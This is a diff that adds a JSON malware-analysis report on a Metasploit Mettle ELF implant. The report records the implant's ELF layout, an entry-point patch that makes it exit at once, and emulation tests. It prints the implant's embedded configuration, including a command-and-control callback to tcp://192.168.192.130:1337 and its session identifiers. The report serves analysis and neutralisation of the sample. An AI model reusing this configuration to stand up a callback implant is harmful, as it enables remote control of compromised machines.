@@ -1,0 +1,118 @@
+{
+  "sample_sha256": "8f0bdcaabfe1089e0ea169eefeb1795bc6ea7762fff2aab0aabc60c8804dd6e2",
+  "sample_size": 1121480,
+  "elf_entry": "0x93ba",
+  "symbol_table_entries": 4489,
+  "config_address": "0x2e31c0",
+  "config_offset": "0xe31c0",
+  "config": "mettle -U \"vaiB0/oaK6u7ub2702Dq8A==\" -G \"AAAAAAAAAAAAAAAAAAAAAA==\" -u \"tcp://192.168.192.130:1337\" -d \"0\" -o \"\" -b \"0\" ",
+  "uuid_hex": "bda881d3fa1a2babbbb9bdbbd360eaf0",
+  "load_segments": [
+    {
+      "p_type": "PT_LOAD",
+      "p_flags": 5,
+      "p_offset": 0,
+      "p_vaddr": 0,
+      "p_paddr": 0,
+      "p_filesz": 913596,
+      "p_memsz": 913596,
+      "p_align": 2097152
+    },
+    {
+      "p_type": "PT_LOAD",
+      "p_flags": 6,
+      "p_offset": 914816,
+      "p_vaddr": 3011968,
+      "p_paddr": 3011968,
+      "p_filesz": 19184,
+      "p_memsz": 78416,
+      "p_align": 2097152
+    }
+  ],
+  "patch": {
+    "offset": "0x93ba",
+    "before": "4831ed4889e7488d35",
+    "after": "31ffb83c0000000f05",
+    "patched_sha256": "70175ce93ed3868708f977a6b7d7e71a35c0aada00082cc66b3be2aced4c893a",
+    "length_unchanged": true
+  },
+  "emulation_base": "0x1000000",
+  "tests": {
+    "original_config": {
+      "instructions": 5255,
+      "returned": true,
+      "comparison_eax": 9,
+      "events": [
+        {
+          "event": "parse_cmdline",
+          "argc": 13,
+          "argv": [
+            "mettle",
+            "-U",
+            "vaiB0/oaK6u7ub2702Dq8A==",
+            "-G",
+            "AAAAAAAAAAAAAAAAAAAAAA==",
+            "-u",
+            "tcp://192.168.192.130:1337",
+            "-d",
+            "0",
+            "-o",
+            "",
+            "-b",
+            "0"
+          ]
+        },
+        {
+          "event": "mettle_set_uuid_base64",
+          "intercepted": true,
+          "value": "vaiB0/oaK6u7ub2702Dq8A=="
+        },
+        {
+          "event": "mettle_set_session_guid_base64",
+          "intercepted": true,
+          "value": "AAAAAAAAAAAAAAAAAAAAAA=="
+        },
+        {
+          "event": "c2_add_transport_uri",
+          "intercepted": true,
+          "value": "tcp://192.168.192.130:1337"
+        }
+      ],
+      "final_rip": "0x5000000",
+      "log_level": 0
+    },
+    "skip_config_branch": {
+      "instructions": 76,
+      "returned": true,
+      "comparison_eax": 9,
+      "events": [],
+      "final_rip": "0x5000000",
+      "log_level": 0
+    },
+    "sentinel_config": {
+      "instructions": 368,
+      "returned": true,
+      "comparison_eax": 0,
+      "events": [],
+      "final_rip": "0x5000000",
+      "log_level": 0
+    },
+    "exit_at_entry": {
+      "instructions": 3,
+      "returned": false,
+      "comparison_eax": null,
+      "events": [
+        {
+          "event": "syscall_intercepted",
+          "number": 60,
+          "arg1": 0,
+          "host_forwarded": false
+        }
+      ],
+      "final_rip": "0x10093c3",
+      "log_level": 0
+    }
+  },
+  "all_assertions_passed": true,
+  "scope": "Emulation de fonctions ciblees et du point entree modifie, pas execution Linux complete."
+}
